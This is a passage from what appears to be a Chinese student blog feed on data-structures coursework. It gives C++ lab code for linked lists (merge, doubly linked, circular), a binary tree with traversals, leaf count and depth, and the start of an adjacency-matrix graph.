class="string">&quot;执行遍历链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请删除一个新数字元素，请输入位置&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    cin &gt;&gt; l;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;删除的元素位置是&quot;</span> &lt;&lt; l &lt;&lt; <span class="string">&quot;数据是&quot;</span> &lt;&lt; L.<span class="built_in">Get</span>(l) &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">Delete</span>(l);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;执行遍历链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先创建了一个空的单链表，然后向其中添加了一些节点。然后，它遍历了整个列表，查找了一个元素，插入了一个新的元素，删除了一个元素，然后再次遍历了整个列表。希望这个示例能对你有所帮助！</p>
<h1 id="两个有序单链表合并为一个有序单链表"><a href="#两个有序单链表合并为一个有序单链表" class="headerlink" title="两个有序单链表合并为一个有序单链表"></a>两个有序单链表合并为一个有序单链表</h1><p>当然，这是一个包含main函数的完整程序，它创建了两个有序链表，并将它们合并为一个有序链表：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义链表节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并两个有序链表</span></span><br><span class="line"><span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l1 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l1-&gt;val &lt; l2-&gt;val) &#123;</span><br><span class="line">        l1-&gt;next = <span class="built_in">mergeTwoLists</span>(l1-&gt;next, l2);</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l2-&gt;next = <span class="built_in">mergeTwoLists</span>(l1, l2-&gt;next);</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建第一个有序链表：1 -&gt; 3 -&gt; 5</span></span><br><span class="line">    ListNode *l1 = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">1</span>);</span><br><span class="line">    l1-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">3</span>);</span><br><span class="line">    l1-&gt;next-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建第二个有序链表：2 -&gt; 4 -&gt; 6</span></span><br><span class="line">    ListNode *l2 = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">2</span>);</span><br><span class="line">    l2-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">4</span>);</span><br><span class="line">    l2-&gt;next-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并两个有序链表</span></span><br><span class="line">    ListNode *merged = <span class="built_in">mergeTwoLists</span>(l1, l2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印合并后的链表</span></span><br><span class="line">    <span class="keyword">while</span> (merged != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; merged-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        merged = merged-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先创建了两个有序链表<code>l1</code>和<code>l2</code>，然后调用<code>mergeTwoLists</code>函数将它们合并为一个新的有序链表。最后，它遍历新的链表并打印出每个节点的值。</p>
<p>请注意，这个程序没有释放分配给链表节点的内存。在实际使用中，你应该在不再需要节点时释放它们的内存，以防止内存泄漏。此外，这个程序假设输入的链表已经排序。如果输入的链表没有排序，你需要先对它们进行排序。	</p>
<h1 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h1><p>双链表是一种更复杂的线性数据结构，它的每个节点都有两个链接，一个指向前一个节点，另一个指向后一个节点。以下是一个使用C++实现的双链表的基本设计：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义双链表节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *prev;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">prev</span>(<span class="literal">NULL</span>), <span class="built_in">next</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加节点到双链表的末尾</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addNode</span><span class="params">(ListNode* &amp;head, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    ListNode* newNode = <span class="keyword">new</span> <span class="built_in">ListNode</span>(val);</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        head = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ListNode* temp = head;</span><br><span class="line">        <span class="keyword">while</span> (temp-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;next = newNode;</span><br><span class="line">        newNode-&gt;prev = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印双链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode* temp = head;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; temp-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个空的双链表</span></span><br><span class="line">    ListNode* head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加节点到双链表</span></span><br><span class="line">    <span class="built_in">addNode</span>(head, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">addNode</span>(head, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">addNode</span>(head, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印双链表</span></span><br><span class="line">    <span class="built_in">printList</span>(head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先定义了一个双链表节点的结构，然后定义了两个函数：<code>addNode</code>用于向双链表的末尾添加新的节点，<code>printList</code>用于打印双链表的所有节点。在<code>main</code>函数中，它创建了一个空的双链表，然后添加了几个节点，并打印出了这个双链表。</p>
<p>请注意，这个程序没有释放分配给链表节点的内存。在实际使用中，你应该在不再需要节点时释放它们的内存，以防止内存泄漏。此外，你可能还需要实现其他操作，如删除节点、查找节点等。这取决于你的具体需求。如果你需要帮助实现这些操作，请随时向我询问！</p>
<h1 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h1><p>循环链表是一种特殊的链表，其中最后一个元素指向链表的第一个元素。这种类型的数据结构可以用于实现需要循环或重复的算法。以下是一个使用C++实现的循环链表的基本设计：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义链表节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加节点到循环链表的末尾</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addNode</span><span class="params">(ListNode* &amp;head, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    ListNode* newNode = <span class="keyword">new</span> <span class="built_in">ListNode</span>(val);</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        head = newNode;</span><br><span class="line">        newNode-&gt;next = head;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ListNode* temp = head;</span><br><span class="line">        <span class="keyword">while</span> (temp-&gt;next != head) &#123;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;next = newNode;</span><br><span class="line">        newNode-&gt;next = head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印循环链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    ListNode* temp = head;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; temp-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (temp != head);</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个空的循环链表</span></span><br><span class="line">    ListNode* head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加节点到循环链表</span></span><br><span class="line">    <span class="built_in">addNode</span>(head, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">addNode</span>(head, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">addNode</span>(head, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印循环链表</span></span><br><span class="line">    <span class="built_in">printList</span>(head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先定义了一个链表节点的结构，然后定义了两个函数：<code>addNode</code>用于向循环链表的末尾添加新的节点，<code>printList</code>用于打印循环链表的所有节点。在<code>main</code>函数中，它创建了一个空的循环链表，然后添加了几个节点，并打印出了这个循环链表。</p>
<p>请注意，这个程序没有释放分配给链表节点的内存。在实际使用中，你应该在不再需要节点时释放它们的内存，以防止内存泄漏。此外，你可能还需要实现其他操作，如删除节点、查找节点等。这取决于你的具体需求。如果你需要帮助实现这些操作，请随时向我询问！</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>实验五 树和二叉树的实现与应用</title>
    <url>/posts/6a30266c.html</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/FtX0PHEedwNLABhhcw4vq0OnXJhk"
                     
                ></p>
<h1 id="吐槽一下"><a href="#吐槽一下" class="headerlink" title="吐槽一下"></a>吐槽一下</h1><p>唉数据结构，唉二叉树，唉C++类，好多都不会，不懂得class类的用法，不知道怎么写代码</p>
<p>先是复制课本上的代码，然后经过缝缝补补，发现课本上的代码竟然有字母打错的可能（痛骂编者</p>
<p>然后用ChatGPT不断缝缝补补（点赞ChatGPT，用来写代码真的很不错</p>
<p>这下知新作业终于是写完了，逆向已经一个也没动了</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiNode</span></span><br><span class="line">&#123;</span><br><span class="line">	DataType data;</span><br><span class="line">	BiNode&lt;DataType&gt;* lchild, * rchild;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BiTree</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">BiTree</span>() &#123; root = <span class="built_in">Creat</span>(); &#125;   <span class="comment">//建立一棵二叉树</span></span><br><span class="line">	~<span class="built_in">BiTree</span>() &#123; <span class="built_in">Release</span>(root); &#125;    <span class="comment">//释放各节点的存储空间</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PreOrder</span><span class="params">()</span> </span>&#123; <span class="built_in">PreOrder</span>(root); &#125;<span class="comment">//前序</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">InOrder</span><span class="params">()</span> </span>&#123; <span class="built_in">InOrder</span>(root); &#125;<span class="comment">//中序</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PostOrder</span><span class="params">()</span> </span>&#123; <span class="built_in">PostOrder</span>(root); &#125;<span class="comment">//后序</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">LevelOrder</span><span class="params">()</span></span>;                  <span class="comment">//层序</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">NodeTree</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">NodeTreeHelper</span>(bt); &#125; <span class="comment">//计算叶子节点数</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">TreeDepth</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">TreeDepthHelper</span>(root); &#125; <span class="comment">//计算二叉树深度</span></span><br><span class="line">	BiNode&lt;DataType&gt;* root;<span class="comment">//指向根节点的头指针</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function">BiNode&lt;DataType&gt;* <span class="title">Creat</span><span class="params">()</span></span>;              <span class="comment">//构造函数调用</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Release</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span></span>;     <span class="comment">//析构函数调用</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PreOrder</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span></span>;    <span class="comment">//前序</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">InOrder</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span></span>;     <span class="comment">//中序</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PostOrder</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span></span>;   <span class="comment">//后序</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">NodeTreeHelper</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span></span>; <span class="comment">//辅助函数用于计算叶子节点数量</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">TreeDepthHelper</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span></span>; <span class="comment">//辅助函数用于计算二叉树深度</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉链表类BiTree的前序遍历</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> BiTree&lt;DataType&gt; ::<span class="built_in">PreOrder</span>(BiNode&lt;DataType&gt;* bt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; bt-&gt;data;</span><br><span class="line">		<span class="built_in">PreOrder</span>(bt-&gt;lchild);</span><br><span class="line">		<span class="built_in">PreOrder</span>(bt-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉链表类BiTree的中序遍历</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> BiTree&lt;DataType&gt; ::<span class="built_in">InOrder</span>(BiNode&lt;DataType&gt;* bt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">InOrder</span>(bt-&gt;lchild);</span><br><span class="line">		cout &lt;&lt; bt-&gt;data;</span><br><span class="line">		<span class="built_in">InOrder</span>(bt-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉链表类BiTree的后序遍历</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> BiTree&lt;DataType&gt; ::<span class="built_in">PostOrder</span>(BiNode&lt;DataType&gt;* bt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">PostOrder</span>(bt-&gt;lchild);</span><br><span class="line">		<span class="built_in">PostOrder</span>(bt-&gt;rchild);</span><br><span class="line">		cout &lt;&lt; bt-&gt;data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉链表类BiTree的层序遍历</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> BiTree&lt;DataType&gt; ::<span class="built_in">LevelOrder</span>()</span><br><span class="line">&#123;</span><br><span class="line">	BiNode&lt;DataType&gt;* Q[<span class="number">100</span>], * q = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="type">int</span> front = <span class="number">-1</span>, rear = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">	Q[++rear] = root;</span><br><span class="line">	<span class="keyword">while</span> (front != rear)</span><br><span class="line">	&#123;</span><br><span class="line">		q = Q[++front];</span><br><span class="line">		cout &lt;&lt; q-&gt;data;</span><br><span class="line">		<span class="keyword">if</span> (q-&gt;lchild != <span class="literal">nullptr</span>)  Q[++rear] = q-&gt;lchild;</span><br><span class="line">		<span class="keyword">if</span> (q-&gt;rchild != <span class="literal">nullptr</span>)  Q[++rear] = q-&gt;rchild;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">BiNode&lt;DataType&gt;* BiTree&lt;DataType&gt;::<span class="built_in">Creat</span>()</span><br><span class="line">&#123;</span><br><span class="line">	BiNode&lt;DataType&gt;* bt;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	cin &gt;&gt; ch;</span><br><span class="line">	<span class="keyword">if</span> (ch == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		bt = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		bt = <span class="keyword">new</span> BiNode&lt;DataType&gt;;</span><br><span class="line">		bt-&gt;data = ch;</span><br><span class="line">		bt-&gt;lchild = <span class="built_in">Creat</span>();</span><br><span class="line">		bt-&gt;rchild = <span class="built_in">Creat</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> BiTree&lt;DataType&gt;::<span class="built_in">Release</span>(BiNode&lt;DataType&gt;* bt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bt == <span class="literal">nullptr</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Release</span>(bt-&gt;lchild);</span><br><span class="line">		<span class="built_in">Release</span>(bt-&gt;rchild);</span><br><span class="line">		<span class="keyword">delete</span> bt;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> BiTree&lt;DataType&gt;::<span class="built_in">NodeTreeHelper</span>(BiNode&lt;DataType&gt;* bt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (bt-&gt;lchild == <span class="literal">nullptr</span> &amp;&amp; bt-&gt;rchild == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">NodeTreeHelper</span>(bt-&gt;lchild) + <span class="built_in">NodeTreeHelper</span>(bt-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> BiTree&lt;DataType&gt;::<span class="built_in">TreeDepthHelper</span>(BiNode&lt;DataType&gt;* bt)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> leftDepth = <span class="built_in">TreeDepthHelper</span>(bt-&gt;lchild);</span><br><span class="line">	<span class="type">int</span> rightDepth = <span class="built_in">TreeDepthHelper</span>(bt-&gt;rchild);</span><br><span class="line">	<span class="keyword">return</span> (leftDepth &gt; rightDepth) ? (leftDepth + <span class="number">1</span>) : (rightDepth + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BiTree&lt;<span class="type">char</span>&gt; t&#123;&#125;;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;前序遍历&quot;</span>;</span><br><span class="line">	t.<span class="built_in">PreOrder</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\n中序遍历&quot;</span>;</span><br><span class="line">	t.<span class="built_in">InOrder</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\n后序遍历&quot;</span>;</span><br><span class="line">	t.<span class="built_in">PostOrder</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\n层序遍历&quot;</span>;</span><br><span class="line">	t.<span class="built_in">LevelOrder</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\n叶子结点数:&quot;</span> &lt;&lt; t.<span class="built_in">NodeTree</span>(t.root);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\n二叉树深度:&quot;</span> &lt;&lt; t.<span class="built_in">TreeDepth</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>实验六 图的构建与遍历</title>
    <url>/posts/7c2ee8e.html</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/FqL91OBssRscbirgk2-0714eojo6"
                      alt="img"
                ></p>
<h1 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h1><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxSize = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> visited[MaxSize] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MGraph</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MGraph</span>(DataType a[], <span class="type">int</span> n, <span class="type">int</span> e);</span><br><span class="line">    ~<span class="built_in">MGraph</span>() &#123;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DFTraverse</span><span class="params">(<span class="type">int</span> v)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">BFTraverse</span><span class="params">(<span class="type">int</span> v)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DataType vertex[MaxSize];</span><br><span class="line">    <span class="type">int</span> edge[MaxSize][MaxSize];</span><br><span class="line">    <span class="type">int</span> vertexNum, edgeNum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">MGraph&lt;DataType&gt;::<span class="built_in">MGraph</span>(DataType a[], <span class="type">int</span> n, <span class="type">int</span> e) &#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    vertexNum = n; edgeNum = e;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vertexNum; i++)</span><br><span class="line">        vertex[i] = a[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vertexNum; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; vertexNum; j++)</span><br><span class="line">            edge[i][j] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; edgeNum; k++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入边依附的两个顶点的编号：&quot;</span>;</span><br><span class="line">        cin &gt;&gt; i &gt;&gt; j;</span><br><span class="line">        edge[i][j] = <span class="number">1</span>; edge[j][i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span 